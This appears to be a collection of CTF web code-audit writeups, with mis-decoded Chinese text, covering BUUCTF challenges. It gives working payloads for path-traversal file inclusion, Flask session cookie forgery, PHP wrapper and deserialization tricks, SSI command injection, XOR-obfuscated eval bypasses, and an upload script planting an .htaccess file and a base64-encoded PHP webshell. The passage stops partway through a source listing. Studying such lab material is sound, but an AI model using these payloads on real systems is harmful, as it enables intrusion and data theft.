[toc]



# ä»£ç å®¡è®¡

## ç›®å½•

### ç®€å•

-   ~~[HCTF 2018] WarmUp éš¾åº¦ï¼šç®€å• çŸ¥è¯†ç‚¹ï¼šåˆæ­¥çš„ä»£ç å®¡è®¡å’Œæ–‡ä»¶åŒ…å«~~
-   ~~[BJDCTF2020]Mark loves cat ç®€å•çš„ä»£ç å®¡è®¡ï¼Œå˜é‡è¦†ç›–~~

### ç­¾åˆ°

-   ~~[HCTF 2018]admin ä¸­ç­‰éš¾åº¦çš„é¢˜ç›®ï¼Œè§£æ³•è¾ƒå¤šï¼Œåˆ†åˆ«æœ‰jwtä¼ªé€ ï¼Œæ¡ä»¶ç«äº‰å’Œunicodeæ¬ºéª—~~
-   ~~[ZJCTF 2019]NiZhuanSiWe åŸºç¡€çš„ä»£ç å®¡è®¡ï¼Œè§£æ³•è¾ƒå¤šï¼Œphpä¼ªåè®®~~
-   ~~[BJDCTF2020]EasySearch é™¤äº†æ³¨å…¥ä»¥å¤–è¿˜ä¼šæœ‰Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´~~
-   ~~[HarekazeCTF2019]encode_and_encode ç¼–ç ç»•è¿‡~~
-   ~~[SUCTF 2019]EasyWeb å½“å¹´æ¯”è¾ƒéš¾çš„é¢˜ç›®ï¼Œç°åœ¨è¿™äº›è€ƒç‚¹è¢«å¹²ç¢äº†å†å‡ºç°å°±åªèƒ½åšç­¾åˆ°äº†~~
-   [å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼  ä»‹ä¹äºç­¾åˆ°å’Œä¸­ç­‰ä¹‹é—´ï¼Œå¤šä¸ªè€ƒç‚¹é‡åˆåœ¨ä¸€èµ·äº†
-   ~~[N1CTF 2018]eating_cms~~
-   ~~[PASECA2019] honey_shop è¯»å–ç¯å¢ƒå˜é‡ï¼Œä»‹ä¹äºç­¾åˆ°å’Œä¸­ç­‰ä¹‹é—´~~
-   ~~Phuck2~~
-   [ç½‘é¼æ¯ 2020 æ€»å†³èµ›]Game Exp

### ä¸­ç­‰

-   [De1CTF 2019]SSRF Me Flask å­—ç¬¦ä¸²æ‹¼æ¥å¸¦æ¥çš„å®‰å…¨é—®é¢˜
-   [HFCTF2020]EasyLogin jwtä¼ªé€ 
-   [SCTF2019]Flag Shop ruby ä»£ç å®¡è®¡
-   [DDCTF 2019]homebrew event loop é€»è¾‘æ¼æ´
-   [XDCTF 2015]filemanager
-   [PwnThyBytes 2019]Baby_SQL
-   [SWPUCTF 2016]Web blogsys å“ˆå¸Œæ‹“å±•æ”»å‡»ï¼Œé€»è¾‘æ¼æ´
-   [PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥ åŠ è§£å¯†é€»è¾‘æœ€å¥½è‡ªå·±èƒ½å¤ŸæŒæ¡ã€‚
-   [CISCN2019 ä¸œåŒ—èµ›åŒº Day2 Web3]Point System
-   [HBCTF2017]å¤§ç¾è¥¿å®‰
-   [N1CTF 2018]easy_harder_php soap_ssrf éå¸¸ç»å…¸çš„é¢˜ç›®
-   [Zer0pts2020]notepad pythonååºåˆ—åŒ–

### å›°éš¾

-   [ç½‘é¼æ¯ 2020 åŠå†³èµ›]faka ä¸­ç­‰åéš¾
-   [RoarCTF 2019]PHPShe
-   [æŠ¤ç½‘æ¯ 2018]easy_laravel
-   [HMBCTF 2021]EzLight çº¢å¸½æ¯å°±3è§£è¿˜æ˜¯å‡ è§£æˆ‘è®°å¾—ã€‚
-   [HITCON 2017]Baby^h Master PHP Apache-preforkæ¨¡å‹(é»˜è®¤æ¨¡å‹)åœ¨æ¥å—è¯·æ±‚åä¼šå¦‚ä½•å¤„ç†,é¦–å…ˆApacheä¼šé»˜è®¤ç”Ÿæˆ5ä¸ªchild serverå»ç­‰å¾…ç”¨æˆ·è¿æ¥, é»˜è®¤æœ€é«˜å¯ç”Ÿæˆ256ä¸ªchild server, è¿™æ—¶å€™å¦‚æœç”¨æˆ·å¤§é‡è¯·æ±‚, Apacheå°±ä¼šåœ¨å¤„ç†å®ŒMaxRequestsPerChildä¸ªtcpè¿æ¥åkillæ‰è¿™ä¸ªè¿›ç¨‹,å¼€å¯ä¸€ä¸ªæ–°è¿›ç¨‹å¤„ç†è¯·æ±‚
-   [CISCN2019 æ€»å†³èµ› Day2 Web2]Laravel File Manager å‚è€ƒæ–‡ç« ï¼šhttps://blog.szfszf.top/article/39/ ä¹Ÿæ˜¯å›½èµ›ç»å…¸ä¸è®©äººåš
-   Real World CTF 2018 Bookhub



### è„‘æ´

-   [ç¾ŠåŸæ¯ 2020]Blackcat è¦å¬æ­Œçš„WEBé¢˜ç›®== 2020ğŸåŸæ¯çš„é¢˜ç›®æ„Ÿè§‰..

## Writeup

### [HCTF 2018] WarmUp

æç¤ºsource.php

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

æ¥æ”¶fileï¼Œä¸ä¸ºç©ºï¼Œæ˜¯å­—ç¬¦ä¸²ï¼Œæ»¡è¶³emmm::checkFile

flagåœ¨ffffllllaaaagggg

```php
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```

ä»è¾“å…¥\$pageçš„ç¬¬ä¸€ä¸ªï¼Ÿå¼€å§‹æˆªå–ï¼Œä¹‹åè¿”å›true

```
source.php?file=source.php?../../../../../../../../../ffffllllaaaagggg
source.php?file=source.php?/../../../../../../../../../ffffllllaaaagggg
source.php?file=source.php?./../../../../../../../../../ffffllllaaaagggg
```

### [BJDCTF2020]Mark loves cat





### [HCTF 2018]admin

æç¤ºä¸æ˜¯adminï¼Œæ³¨å†Œäº†ä¹Ÿæ˜¾ç¤ºä¸æ˜¯admin

#### è§£æ³•ä¸€ï¼šUnicodeæ¬ºéª—

`https://unicode-table.com/en/1D2E/ `è¿™ä¸ªç½‘ç«™æ‰¾å­—ç¬¦

#### è§£æ³•äºŒï¼šflask sessionä¼ªé€ 

å†change passwordé‡Œé¢ï¼š`https://github.com/woadsl1234/hctf_flask/ `

flaskå†™çš„ï¼Œçœ‹ä¸‹è·¯ç”±

```python
@app.route('/code')
def get_code():

@app.route('/index')
def index():

@app.route('/register', methods = ['GET', 'POST'])
def register():

@app.route('/login', methods = ['GET', 'POST'])
def login():

@app.route('/logout')
def logout():

@app.route('/change', methods = ['GET', 'POST'])
def change():

@app.route('/edit', methods = ['GET', 'POST'])
def edit():
```



>   flaskä¸­sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieä¸­çš„ï¼Œä¹Ÿå°±æ˜¯å­˜å‚¨åœ¨æœ¬åœ°ã€‚flaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶sessionçš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„ï¼Œè¿™å°±å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚
>   å…·ä½“å¯å‚è€ƒï¼š
>   https://xz.aliyun.com/t/3569
>   https://www.leavesongs.com/PENETRATION/client-session-security.html#

ä½¿ç”¨è„šæœ¬è§£å¯†ä¸‹session

```python
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```



```sh
python .\session.py .eJw9kEFuwjAQRa9SzZoFcWATiU3lYIE0g1wNQeMNamkosWMqJaBAEHevxaIXeO_9_4D9sav7ExSX7lpPYN98Q_GAty8oAH11Ir_2Gz4MqG2GZnsTDoPbyXyjt8px2xCHueMqOm8z8XYmTC2aKpAuc9QUKKISjwOZdesijqjKKY7LSErmwj934XIgLTnyNndcjskZ0LggcR1kPLXEq5G48qjwhn4ZSFURPU6dKZMPU8MyNdgFPCdw6Lvj_vIb6vP_BNLUSMol8xFRvzcyWkWqTFqrnF9lju2NjMzczsWEuaORXOzihTt_xjohMpXDBK593b2-gWwKzz9vs2Me.YdfLeA.VeulXD6Mdg2_9S59f8L0urPGapI        
{'_fresh': True, '_id': b'25a62c9700450e1a90ef9856e9b599e5ff45b48a3e0ed41703d6c6b304befc33a431f7f9a82a10467157e1325d0fdbbdc8e52355c3c121d7ef234da5b36e1b54', 'csrf_token': b'43baf94df00bc467a2a46f25e414f8eff5420f7a', 'name': '123', 'user_id': '10'}
```

`{'_fresh': True, '_id': b'25a62c9700450e1a90ef9856e9b599e5ff45b48a3e0ed41703d6c6b304befc33a431f7f9a82a10467157e1325d0fdbbdc8e52355c3c121d7ef234da5b36e1b54', 'csrf_token': b'43baf94df00bc467a2a46f25e414f8eff5420f7a', 'name': '123', 'user_id': '10'}`

å¦‚æœæƒ³è¦åŠ å¯†ä¼ªé€ ç”Ÿæˆè‡ªå·±æƒ³è¦çš„sessionè¿˜éœ€è¦çŸ¥é“SECRET_KEYï¼Œconfig.pyé‡Œå‘ç°äº†SECRET_KEY

`SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'`

![image-20220107131937193](README/image-20220107131937193.png)

ä¸€ä¸ªflask sessionåŠ å¯†çš„è„šæœ¬ï¼š`https://github.com/noraj/flask-session-cookie-manager`

```sh
python flask_session_cookie_manager3.py encode -s "ckj123" -t "'_fresh': True, '_id': b'25a62c9700450e1a90ef9856e9b599e5ff45b48a3 e0ed41703d6c6b304befc33a431f7f9a82a10467157e1325d0fdbbdc8e52355c3c121d7ef234da5b36e1b54', 'csrf_token': b'43baf94df00bc467a2a46f25e4144f8eff5420f7a', 'name': 'admin', 'user_id': '10'}"
.eJw9kEFuwjAQRa9SzZoFccgGiU3lYIE0g1wNQeMNohBK7JhKARQI4u61WPQC773_n7A9dvXlBNNrd6tHsG0OMH3CxzdMAX11Ir_0K973qG2GZn0XDr3bSLHSa-W4bYhD4biKzttMvJ0IU4umCqTLHDUFiqjEY09m2bqIA6pyjMM8kpJC-OchXPakJUde547LITkDGhckLoMMp5Z4MRBXHhXe0c8DqSqix7EzZfJhapinBjuD1wj2l-64vf6G-vw_gTQ1knLJfEXUn40MVpEqk9Yq5xeZY3snIxO3cTFhHmgkFzt74867WCfE7hCbM4zgdqm79zuQjeH1B0iVZJE.YdfOlA.blCrYfgFhjLnD1ZC3mUkZXSmZbE
```

### [ZJCTF 2019]NiZhuanSiWe

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

`file_get_contents`å°†æ–‡ä»¶å†…å®¹è¯»åˆ°`$text`

ä½¿ç”¨php://inputä¼ªåè®®åœ¨ä»¥POSTå½¢å¼ä¼ å…¥â€œ welcome to the zjctf "  ä¹Ÿå¯ä»¥ç”¨dataä¼ªåè®®ä¼ å‚

`enctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„`

![image-20220107133621286](README/image-20220107133621286.png)

æˆ–è€…

```
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```

ä¹‹åæç¤ºuseless.phpï¼Œä½¿ç”¨php://filteræ¥è¯»

`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php`

```php 
<?php 
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
æœ¬åœ°åºåˆ—åŒ–:
$password=new Flag();
$password = serialize($password);
echo $password; 
?>  
```

```
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}  
```

æœ€ç»ˆpayloadï¼š`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`

### [BJDCTF2020]EasySearch

swpæºç æ³„éœ²

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

é¦–å…ˆæ˜¯éšæœºè·å–æ–‡ä»¶åçš„ä¸€ä¸ªå‡½æ•°ï¼Œpasswordçš„å‰å…­ä½çš„MD5ä¸º6d0bc1ï¼Œä¹‹ååœ¨publicæ–‡ä»¶å¤¹ä¸‹å»ºä¸ªshtmlï¼Œ



```python
import hashlib


def md5(s):
    return hashlib.md5(s.encode('utf-8')).hexdigest()


for i in range(10000000):
    if(md5(str(i)).startswith('6d0bc1')):
        print(i)
        break
# 2020666
```

![image-20220107143417593](README/image-20220107143417593.png)

![image-20220107143427843](README/image-20220107143427843.png)


shtmlæ˜¯ä¸€ç§ç”¨äºSSIæŠ€æœ¯çš„æ–‡ä»¶ã€‚

ä¼šå¯¹shtmlæ–‡ä»¶ç‰¹æ®Šæ‹›å¾…ã€‚ å…ˆæ‰«ä¸€æ¬¡shtmlæ–‡ä»¶çœ‹æ²¡æœ‰ç‰¹æ®Šçš„SSIæŒ‡ä»¤ç°åœ¨ã€‚

æœ‰å°±æŒ‰Web Serverè®¾å®šè§„åˆ™è§£é‡ŠSSIæŒ‡ä»¤ã€‚ è§£é‡Šå®Œåè·Ÿä¸€èˆ¬htmlä¸€èµ·æ‰å»å®¢æˆ·ç«¯ã€‚

SSIæ³¨å…¥æ¼æ´ï¼Œå¯ä»¥åœ¨usernameå˜é‡ä¸­ä¼ å…¥ssiè¯­å¥æ¥è¿œç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚

>   ï¼ˆshtmlæ˜¯ä¸€ç§åŸºäºSSIæŠ€æœ¯çš„æ–‡ä»¶ã€‚SSI æ³¨å…¥å…¨ç§°Server-Side Includes Injectionï¼Œå³æœåŠ¡ç«¯åŒ…å«æ³¨å…¥ã€‚SSI æ˜¯ç±»ä¼¼äº CGIï¼Œç”¨äºåŠ¨æ€é¡µé¢çš„æŒ‡ä»¤ã€‚SSI æ³¨å…¥å…è®¸è¿œç¨‹åœ¨ Web åº”ç”¨ä¸­æ³¨å…¥è„šæœ¬æ¥æ‰§è¡Œä»£ç ã€‚SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚IISå’ŒApacheéƒ½å¯ä»¥å¼€å¯SSIåŠŸèƒ½ï¼‰
>
>   ï¼ˆSSIæ³¨å…¥çš„æ¡ä»¶ï¼š
>
>   1.Web æœåŠ¡å™¨å·²æ”¯æŒSSIï¼ˆæœåŠ¡å™¨ç«¯åŒ…å«ï¼‰
>
>   2.Web åº”ç”¨ç¨‹åºæœªå¯¹å¯¹ç›¸å…³SSIå…³é”®å­—åšè¿‡æ»¤
>
>   3.Web åº”ç”¨ç¨‹åºåœ¨è¿”å›å“åº”çš„HTMLé¡µé¢æ—¶ï¼ŒåµŒå…¥ç”¨æˆ·è¾“å…¥ï¼‰

payload :`<!--#exec cmd="ls ../"-->`

### [HarekazeCTF2019]encode_and_encode 

```php
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]);
```

ä¼ å…¥çš„postå†…å®¹ä¼šè¢«json_decodeï¼Œä¹‹ååˆ¤æ–­æ˜¯å¦æœ‰banwordé‡Œé¢çš„å†…å®¹ã€‚jsonç¼–ç 
payloadï¼š

`{ "page" : "\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}`

`{"page":"\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067"}`

### [SUCTF 2019]EasyWeb

>   PHPå¼‚æˆ–ç»•è¿‡ä¸ªPreg_match()ï¼šhttps://www.cnblogs.com/cimuhuashuimu/p/11546422.html

```php
<?php
function get_the_flag() {
	// webadmin will remove your upload file every 20 min!!!! 
	$userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
	if(!file_exists($userdir)) {
		mkdir($userdir);
	}
	if(!empty($_FILES["file"])) {
		$tmp_name = $_FILES["file"]["tmp_name"];//å·²ä¸Šä¼ æ–‡ä»¶åœ¨æœåŠ¡å™¨ç«¯ä¿å­˜çš„ä¸´æ—¶æ–‡ä»¶åï¼ŒåŒ…å«è·¯å¾„
		$name = $_FILES["file"]["name"];//å®¢æˆ·ç«¯ä¸Šä¼ æ–‡ä»¶çš„åŸåç§°ï¼Œä¸åŒ…å«è·¯å¾„
		$extension = substr($name, strrpos($name,".")+1);
		if(preg_match("/ph/i",$extension)) 
            die("^_^");
		if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) 
            die("^_^");
		if(!exif_imagetype($tmp_name)) 
            die("^_^");
		$path= $userdir."/".$name;
		@move_uploaded_file($tmp_name, $path);
		print_r($path);
	}
}
$hhh = @$_GET['_'];
if (!$hhh) {
	highlight_file(__FILE__);
}
if(strlen($hhh)>18) {
	die('One inch long, one inch strong!');
}
if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');
$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");
eval($hhh);
?>
```

é€šè¿‡evalè°ƒç”¨get_the_flag

å¯ä»¥å‡ºç°çš„å­—ç¬¦ï¼š

```php
<?php
for($a = 0; $a < 256; $a++){
    if (!preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($a))){
        echo chr($a)." ";
    }
}
```

åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°a-zä¸­æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚

åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œå…ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆäºŒè¿›åˆ¶å†è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œï¼Œåˆå°†ç»“æœä»äºŒè¿›åˆ¶è½¬æ¢æˆäº†ASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å¼‚æˆ–æ“ä½œæœ‰æ—¶ä¹Ÿè¢«ç”¨æ¥äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼

```php
<?php
$l = "";
$r = "";
$argv = str_split("_GET");
for($i=0;$i<count($argv);$i++)
{
    for($j=0;$j<255;$j++)
    {
        $k = chr($j)^chr(255);      \\dechex(255) = ff
        if($k == $argv[$i]){
        	if($j<16){
        		$l .= "%ff";
                $r .= "%0" . dechex($j);
        		continue;
        	}
            $l .= "%ff";
            $r .= "%" . dechex($j);
            continue;
        }
    }
}
echo "\{$l`$r\}";
?>
//{%ff%ff%ff%ff`%a0%b8%ba%ab}
```

æ‰€ä»¥æ„é€ ï¼š`/?_=${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&%A0=phpinfo`æˆ–è€…`/?_=${%ff%ff%ff%ff^%A0%B8%BA%AB}{%A0}();&%A0=phpinfo`å¯ä»¥è®¿é—®phpinfo

```
##  1^2=2^1
## è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯${_GET}{%A0}å°±ç­‰äº$_GET[%A0],%A0æ˜¯ä¸€ä¸ªå­—ç¬¦è™½ç„¶æ²¡æœ‰è¢«å¼•å·å¼•èµ·æ¥ä½†æ˜¯phpä¹Ÿä¸ä¼šå°†ä»–çœ‹å‡ºæ˜¯å˜é‡ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ&_GET[cmd]=&_GET["cmd"] äº†ã€‚
## è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§æ˜¯$a=phpinfo å¦‚æœæ‰§è¡Œ$a() å°±ç›¸å½“äºæ‰§è¡Œäº†phpinfo()
```

æ¥ä¸‹æ¥ï¼Œè¿‡æ»¤äº†phå¼€å¤´çš„åç¼€ï¼Œåˆè¿‡æ»¤äº†<?ï¼Œé»‘åå•é™åˆ¶ï¼Œä½†æ˜¯æ²¡æœ‰ç¦ç”¨.htaccessï¼Œå¯ä»¥æ„é€ .htaccessä¿®æ”¹å¯è¯»çš„phpæ–‡ä»¶ï¼Œåˆ©ç”¨.htaccessç»•è¿‡

```python
import requests
import time

url = r"http://9fd4f5c0-f1b8-4e4b-9c10-c4de6f143333.node4.buuoj.cn:81/?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=get_the_flag"
session = requests.session()
htaccess_content = '''
#define width 1337
#define height 1337
AddType application/x-httpd-php .a
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.a"
'''
files_htaccess = {'file': (
    '.htaccess', htaccess_content, 'image/jpeg')}
res_hta = session.post(url, files=files_htaccess)
print(res_hta.text)
shell_file = 'GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg=='
files_shell = {'file': (
    'shell.a', shell_file, 'image/jpeg')}
res_jpg = session.post(url, files=files_shell)

print(res_jpg.text)

```

htaccessçš„é…ç½®ä¿¡æ¯

>   AddType application/x-httpd-php .test   ###å°†1.testä»¥phpçš„æ–¹å¼è§£æ
>   php_value auto_append_file  "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/1.test"
>   \##åœ¨1.teståŠ è½½å®Œæ¯•åï¼Œå†æ¬¡åŒ…å«base64è§£ç åçš„1.testï¼ŒæˆåŠŸgetshellï¼Œæ‰€ä»¥è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¼šå‡ºç°ä¸¤æ¬¡1.testå†…å®¹çš„åŸå› ï¼Œç¬¬ä¸€æ¬¡æ˜¯æ²¡æœ‰ç»è¿‡base64è§£å¯†çš„ï¼Œç¬¬äºŒæ¬¡æ˜¯ç»è¿‡è§£å¯†å¹¶ä¸”è½¬åŒ–ä¸ºphpäº†çš„ã€‚

èšå‰‘è¿ä¸Šä¹‹åçœ‹ä¸äº†å…¶ä»–ç›®å½•

[bypass open_basedirçš„æ–°æ–¹æ³•](https://xz.aliyun.com/t/4720)

æ‰«ç›®å½•ï¼š`cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));`

è¯»æ–‡ä»¶ï¼š`chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/THis_Is_tHe_F14g'));`



### [N1CTF 2018]eating_cms

å°è¯•æ³¨å†Œé¡µé¢æ³¨å†Œï¼Œ

ä¹‹åçš„urlæ˜¯è¿™ä¸ªæ ·å­ï¼š`http://d3b136f1-031c-4ec7-9841-c9ae9ad3bd68.node4.buuoj.cn:81/user.php?page=guest`

ä¼ªåè®®è¯»æºç ï¼š`user.php?page=php://filter/convert.base64-encode/resource=user`

```php+HTML
<?php
require_once("function.php");
if( !isset( $_SESSION['user'] )){
    Header("Location: index.php");

}
if($_SESSION['isadmin'] === '1'){
    $oper_you_can_do = $OPERATE_admin;
}else{
    $oper_you_can_do = $OPERATE;
}
//die($_SESSION['isadmin']);
if($_SESSION['isadmin'] === '1'){
    if(!isset($_GET['page']) || $_GET['page'] === ''){
        $page = 'info';
    }else {
        $page = $_GET['page'];
    }
}
else{
    if(!isset($_GET['page'])|| $_GET['page'] === ''){
        $page = 'guest';
    }else {
        $page = $_GET['page'];
        if($page === 'info')
        {
//            echo("<script>alert('no premission to visit info, only admin can, you are guest')</script>");
            Header("Location: user.php?page=guest");
        }
    }
}
filter_directory();
//if(!in_array($page,$oper_you_can_do)){
//    $page = 'info';
//}
include "$page.php";
?>
```

ç»§ç»­è¯»function.php

```php
<?php
session_start();
require_once "config.php";
function Hacker()
{
    Header("Location: hacker.php");
    die();
}


function filter_directory()
{
    $keywords = ["flag","manage","ffffllllaaaaggg"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}

function filter_directory_guest()
{
    $keywords = ["flag","manage","ffffllllaaaaggg","info"];
